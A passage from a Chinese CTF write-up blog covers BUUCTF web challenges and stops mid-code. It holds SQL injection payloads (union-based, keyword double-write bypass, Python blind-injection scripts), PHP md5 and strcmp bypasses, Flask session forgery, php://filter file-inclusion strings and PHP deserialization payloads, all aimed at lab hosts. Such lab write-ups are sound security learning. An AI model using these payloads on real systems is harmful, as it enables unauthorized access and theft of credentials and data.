<p>补充系统变量@@sql_mode：是一组mysql支持的基本语法及校验规则<br>PIPES_AS_CONCAT：将“||”视为字符串的连接操作符而非或运算符，也和字符串的拼接函数Concat相类似</p>
</blockquote>
<p>原本||是or的意思，这里拼接之后：</p>
<p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823215540471.png" alt="image-20200823215540471"></p>
<p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823215640962.png" alt="image-20200823215640962"></p>
<h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>直接万能密码登录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; or 1&#x3D;1 %23&amp;password&#x3D;1&#39; or 1&#x3D;1%23</span><br></pre></td></tr></table></figure>
<p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823221210961.png" alt="image-20200823221210961"></p>
<h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>简单的sql注入</p>
<p>直接union注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())#</span><br><span class="line">1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;geekuser&quot;),(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;l0ve1ysq1&quot;)#</span><br><span class="line">1&#39; union select 1,(select group_concat(password) from geekuser),(select group_concat(password) from l0ve1ysq1)#</span><br></pre></td></tr></table></figure>
<h2 id="极客大挑战-2019-BabySQL（过滤关键字）"><a href="#极客大挑战-2019-BabySQL（过滤关键字）" class="headerlink" title="[极客大挑战 2019]BabySQL（过滤关键字）"></a>[极客大挑战 2019]BabySQL（过滤关键字）</h2><p>双写绕过</p>
<p>查关键字可以先select语句观察哪些被过滤了。</p>
<p>其中关键字有select，union，or（包括information,password），from，where，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; ununionion selselectect  1,(selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema&#x3D;database()),3 #</span><br><span class="line">&#x2F;&#x2F;b4bsql,geekuser</span><br><span class="line">1&#39; ununionion selselectect  1,(selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name&#x3D;&#39;b4bsql&#39;),(selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name&#x3D;&#39;geekuser&#39;) #</span><br><span class="line">&#x2F;&#x2F;id username password</span><br><span class="line">&#x2F;&#x2F;id username password</span><br><span class="line">1&#39; ununionion selselectect  1,(selselectect group_concat(username,passwoorrd) frfromom b4bsql),(selselectect group_concat(username,passwoorrd) frfromom geekuser) #</span><br><span class="line">flag&#123;1745650a-3c83-4068-a316-f2604dc9e366&#125;</span><br></pre></td></tr></table></figure>
<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World（过滤关键字和空格的盲注）"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World（过滤关键字和空格的盲注）" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World（过滤关键字和空格的盲注）"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World（过滤关键字和空格的盲注）</h2><p>简单测试了一下</p>
<p>发现空格被过滤了，union、and、or也被过滤了，并且发现列有两列，报错只出bool，于是就想到是不是盲注，但首要问题是怎么绕过空格</p>
<p>以下有几种绕空格的办法</p>
<blockquote>
<p>/**/ （） %0a `` tab</p>
</blockquote>
<p>这里我们用（）来绕过，接下来就是写脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">dic =<span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">url = <span class="string">"http://fb5af086-8bde-4cdd-8d2e-fcc9fdbe523a.node3.buuoj.cn/index.php"</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        payload = <span class="string">"if((mid((select(flag)from(flag)),&#123;0&#125;,1)='&#123;1&#125;'),1,2)"</span>.format(i,j)</span><br><span class="line">        data = &#123;<span class="string">"id"</span>: payload,&#125;</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Hello"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(payload)</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">拿到flag</span><br><span class="line">flag&#123;3ba1b350-3474-44d2-a3cd-52f61aaeca64&#125;</span><br></pre></td></tr></table></figure>
<p>但我自己写的脚本很诡异，无法检测到-，只能通过payload倒推</p>
<p>所以又换了一个写了一下,用ascii字符来判断</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">dic =<span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">url = <span class="string">"http://fb5af086-8bde-4cdd-8d2e-fcc9fdbe523a.node3.buuoj.cn/index.php"</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        payload = <span class="string">"if(ascii(mid((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;,1,2)"</span>.format(i,j);</span><br><span class="line">        data = &#123;<span class="string">"id"</span>: payload,&#125;</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Hello"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(payload)</span><br><span class="line">            flag += str(chr(j))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>
<p>刚写脚本，对其中原理还不是很熟悉，希望后续能深入学习py</p>
<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p>直接看源码</p>
<p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823222031931.png" alt="image-20200823222031931"></p>
<p>拿flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat&#x3D;dog</span><br></pre></td></tr></table></figure>
<p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823222049635.png" alt="image-20200823222049635"></p>
<h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>主要说一下两个函数</p>
<p><strong>strcmp()</strong></p>
<blockquote>
<p>strcmp()函数只有在相等的情况下返回0。<br>那么我们传入一个数组，它会返回NULL，而判断使用了== ，而NULL==0是bool(true)，这样就成功绕过。</p>
</blockquote>
<p><strong>is_numeric()</strong></p>
<blockquote>
<p>is_numeric() 判断变量是否为数字或数字字符串，不仅检查10进制，16进制也可以。<br>is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对于第一个空格字符会跳过空格字符判断，接着后面的判断！<br>该函数还可能造成sql注入，例如将‘1 or 1’转换为16进制形式，再传参，就可以造成sql注入</p>
</blockquote>
<p>之后就是改cookie，post进password和money</p>
<p>这里判断money相等用的是strcmp()所以我们可以用数组绕过</p>
<h2 id="BJDCTF2020-Easy-MD5（ffifdyop）"><a href="#BJDCTF2020-Easy-MD5（ffifdyop）" class="headerlink" title="[BJDCTF2020]Easy MD5（ffifdyop）"></a>[BJDCTF2020]Easy MD5（<strong>ffifdyop</strong>）</h2><p>发了几个数字后没发现什么东西，然后抓包，看见hint</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from &#39;admin&#39; where password&#x3D;md5($pass,true)</span><br></pre></td></tr></table></figure>
<p>这里想要绕过的话肯定是找万能密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">password&#x3D;&#39;&#39; or &#39;123&#39;</span><br></pre></td></tr></table></figure>
<p>这里的话用的是<strong>ffifdyop</strong>MD5加密后为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;or&#39;6É]™é!r,ùíb</span><br></pre></td></tr></table></figure>
<p>符合万能密码</p>
<p>进入下一关</p>
<p>源码如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a &#x3D; $GET[&#39;a&#39;];</span><br><span class="line">$b &#x3D; $_GET[&#39;b&#39;];</span><br><span class="line"></span><br><span class="line">if($a !&#x3D; $b &amp;&amp; md5($a) &#x3D;&#x3D; md5($b))&#123;</span><br><span class="line">    &#x2F;&#x2F; wow, glzjin wants a girl friend.</span><br></pre></td></tr></table></figure>
<p>这个可以拿数组过，也可以找一些特殊的如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">240610708</span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s214587387a</span><br></pre></td></tr></table></figure>
<p>他们的MD5都是0</p>
<p>最后一关源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if($_POST[&#39;param1&#39;]!&#x3D;&#x3D;$_POST[&#39;param2&#39;]&amp;&amp;md5($_POST[&#39;param1&#39;])&#x3D;&#x3D;&#x3D;md5($_POST[&#39;param2&#39;]))&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接拿数组绕过就好</p>
<p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200903205415553.png" alt="image-20200903205415553"></p>
<h3 id><a href="#" class="headerlink" title=" "></a> </h3><h1 id="开发"><a href="#开发" class="headerlink" title="开发"></a>开发</h1><h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>学习一下tornado</p>
<p><a href="https://blog.csdn.net/belalds/article/details/80575755" target="_blank" rel="noopener">https://blog.csdn.net/belalds/article/details/80575755</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">import</span> tornado.ioloop</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexHandler</span><span class="params">(tornado.web.RequestHandler)</span>:</span></span><br><span class="line">    <span class="string">"""主路由处理类"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""对应http的get请求方式"""</span></span><br><span class="line">        self.write(<span class="string">"Hello Itcast!"</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app = tornado.web.Application([</span><br><span class="line">        (<span class="string">r"/"</span>, IndexHandler),</span><br><span class="line">    ])</span><br><span class="line">    app.listen(<span class="number">8000</span>)</span><br><span class="line">    tornado.ioloop.IOLoop.current().start()</span><br></pre></td></tr></table></figure>
<ol>
<li>tornado.web</li>
</ol>
<p>tornado的基础web框架模块</p>
<ul>
<li><strong>RequestHandler</strong></li>
</ul>
<p>封装了对应一个请求的所有信息和方法，write(响应信息)就是写响应信息的一个方法；对应每一种http请求方式（get、post等），把对应的处理逻辑写进同名的成员方法中（如对应get请求方式，就将对应的处理逻辑写在get()方法中），当没有对应请求方式的成员方法时，会返回“<strong>405: Method Not Allowed</strong>”错误。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">import</span> tornado.ioloop</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexHandler</span><span class="params">(tornado.web.RequestHandler)</span>:</span></span><br><span class="line">    <span class="string">"""主路由处理类"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self)</span>:</span>  <span class="comment"># 我们修改了这里</span></span><br><span class="line">        <span class="string">"""对应http的post请求方式"""</span></span><br><span class="line">        self.write(<span class="string">"Hello Itcast!"</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app = tornado.web.Application([</span><br><span class="line">        (<span class="string">r"/"</span>, IndexHandler),</span><br><span class="line">    ])</span><br><span class="line">    app.listen(<span class="number">8000</span>)</span><br><span class="line">    tornado.ioloop.IOLoop.current().start()</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>Application</strong></li>
</ul>
<p>Tornado Web框架的核心应用类，是与服务器对接的接口，里面保存了路由信息表，其初始化接收的第一个参数就是一个路由信息映射元组的列表；其listen(端口)方法用来创建一个http服务器实例，并绑定到给定端口（<strong>注意：此时服务器并未开启监听</strong>）。</p>
<p><strong>总结Tornado Web程序编写思路</strong></p>
<ol>
<li>创建web应用实例对象，第一个初始化参数为路由映射列表。</li>
<li>定义实现路由映射列表中的handler类。</li>
<li>创建服务器实例，绑定服务器端口。</li>
<li>启动当前线程的IOLoop。</li>
</ol>
<h2 id="HCTF-2018-admin（flask中session伪造）"><a href="#HCTF-2018-admin（flask中session伪造）" class="headerlink" title="[HCTF 2018]admin（flask中session伪造）"></a>[HCTF 2018]admin（flask中session伪造）</h2><p>发现只能admin才能登录获取flag</p>
<p>主要学习一下flask中的session伪造</p>
<p><strong>session一般存储在服务器，而在flask中，session是存储在客户端，并且flask中对数据仅仅进行了签名，签名主要目的是防止篡改，但却无法防止被读取。所以就会产生一些安全问题。</strong></p>
<p>在这个题中，我们就可以根据这个来解题</p>
<p>先来看一下自己注册用户test的cookie，之后进行解码，可以参考p牛的脚本，也可以上github上找flask-session-manager之后done下来</p>
<p>我这里用的是python2.7</p>
<p>解密:<code>python flask_session_manager2.py decode -c -s # -c是flask cookie里的session值 -s参数是SECRET_KEY</code><br> 加密:<code>python flask_session_manager2.py encode -s -t # -s参数是SECRET_KEY -t参数是session的参照格式，也就是session解密后的格式</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.eJw9kEGPgjAQhf_KZs4eBJcLiZdNkUjSIZBKM70Y10VKS90EMCjG_77VTbxN8mbe-97cYX_q60FDPPaXegH79gfiO3x8Qwzc8WUuN45kaXLRGWSVphC1Mk2Uy6ojWYRosg7DTYuzNmi0Ib_HjXY8pJWS6Ge6cZlc8zQJlKlabjLHWWn5vHFcFCtMdzeabcRd5hTbTWjsFV0RkdtFitlJCZ_FmiuZUpOgT5KVU6IIFPM8YRKQ0JYLWsNjAcehP-3HX1uf3xWQFQGm2-l5ygW2Sm5DlVYdTynC2WN4TBJf3RORRGbRHG-qWb_sWndo6rdTmWSzmP6V88F5AcZ6GGEBl6HuX2-DYAmPP9bObbw.X1R2Pw.c_FhTL4z1ufpRuGX5k2__AoFhBU</span><br><span class="line">&#123;u&#39;csrf_token&#39;: &#39;4454b0a6813beb6dee0f974d3f7a0e1a1a2d672f&#39;, u&#39;user_id&#39;: u&#39;10&#39;, u&#39;name&#39;: u&#39;test&#39;, u&#39;image&#39;: &#39;DBsO&#39;, u&#39;_fresh&#39;: True, u&#39;_id&#39;: &#39;2c49afadc99c45accaf899eead662e7ab78c68ca9c28f3f7ecc2621a18a5f5b22f04d31f1474e2c992bfd506916d9be9d90e89881b4aa68aefe45d9c7a5a8d16&#39;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.eJw9kE-LwjAQxb_KMmcPtm4vgpcltVjIlJbYMLmIf2rTpHGhVVorfveNLngbeDPv_d48YHfuql7D8trdqhnsmhMsH_B1gCVwx-eZXDuShclEa5CVmkLUytRRJsuWZB6iSVsM1w1O2qDRhvweN9rxkBZKop_pzmU8ZkkcKFM23KSOs8Lyae24yBeYbO802Yi71Cm2HdDYEV0ekdtGitlBCZ_F6pFMoUnQN8nSKZEHinmeMA5IaMsFreA5g2PfnXfXX1tdPhWQ5QEmm-F1ygU2Sm5ClZQtTyjCyWN4TBI_7QuRRGrRHO-qXr3tGrevq49TEaeTGP6Vy955AfYn11xgBre-6t5_g2AOzz9EfG4F.X1R5Og.sdx02y47Ad8Rck93GVBwZ0RVTOs</span><br></pre></td></tr></table></figure>
<p>之后进行改密码登录就可以。</p>
<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="极客大挑战-2019-Secret"><a href="#极客大挑战-2019-Secret" class="headerlink" title="[极客大挑战 2019]Secret"></a>[极客大挑战 2019]Secret</h2><p>一直查看源码最后只需要用一个文件包含就可以读出flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;xxx.php</span><br><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php</span><br></pre></td></tr></table></figure>
<h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p>直接读取flag.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
<h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><h2 id="极客大挑战-2019-PHP（简单反序列化）"><a href="#极客大挑战-2019-PHP（简单反序列化）" class="headerlink" title="[极客大挑战 2019]PHP（简单反序列化）"></a>[极客大挑战 2019]PHP（简单反序列化）</h2><p>考察php反序列化，先下载www.zip里面有三个文件，其中有class.php，index.php，flag.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username &#x3D; &#39;nonono&#39;;</span><br><span class="line">    private $password &#x3D; &#39;yesyes&#39;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username &#x3D; $username;</span><br><span class="line">        $this-&gt;password &#x3D; $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username &#x3D; &#39;guest&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password !&#x3D; 100) &#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;NO!!!hacker!!!&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;) &#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;hello my friend~~&lt;&#x2F;br&gt;sorry i can&#39;t give you the flag!&quot;;</span><br><span class="line">            die();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>其中逻辑就是密码为100，并且username=’admin‘</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $username = <span class="string">"admin"</span>;</span><br><span class="line">	<span class="keyword">private</span> $password = <span class="string">"100"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Name();</span><br><span class="line">$a = serialize($a); </span><br><span class="line"><span class="keyword">echo</span> urlencode($a);</span><br><span class="line"><span class="comment">//O:4:"Name":3:&#123;s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";s:3:"100";&#125;</span></span><br></pre></td></tr></table></figure>
<p>最后进行url编码就行。</p>
<h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;  <span class="comment">//text的内容为welcome to the zjctf</span></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;  <span class="comment">//file的内容不能包含flag</span></span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);  <span class="comment">//反序列化</span></span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>看源码知道共有三个参数，所以依次判断</p>
<p>text的内容为welcome to the zjctf，所以我们可以用data协议</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf</span><br><span class="line">text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;</span><br></pre></td></tr></table></figure>
<p>之后是file，题中已经提示了useless.php，说明我们首先得拿出源码，之后包含这个文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</span><br></pre></td></tr></table></figure>
<p>拿出源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>之后就是password，很明显是序列化</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;5bfc7735-e6c3-4e4b-9612-573138d921bd.node3.buuoj.cn&#x2F;?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>查看源码就有flag</p>
<h2 id="网鼎杯-2018-Fakebook（报错注入和反序列化）"><a href="#网鼎杯-2018-Fakebook（报错注入和反序列化）" class="headerlink" title="[网鼎杯 2018]Fakebook（报错注入和反序列化）"></a>[网鼎杯 2018]Fakebook（报错注入和反序列化）</h2><p>首先发现信息泄露</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;user.php.bak</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (int)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;	<span class="comment">//创建一个curl资源</span></span><br><span class="line">        $ch = curl_init();</span><br><span class="line">       <span class="comment">//设置url和相应的选项</span></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">      <span class="comment">//抓取url并传递给浏览器</span></span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="comment">//关闭curl资源，并且释放系统资源</span></span><br><span class="line">        curl_close($ch);</span><br><span class="line">			<span class="comment">//唯一的参数是curl_init()函数返回的句柄</span></span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, 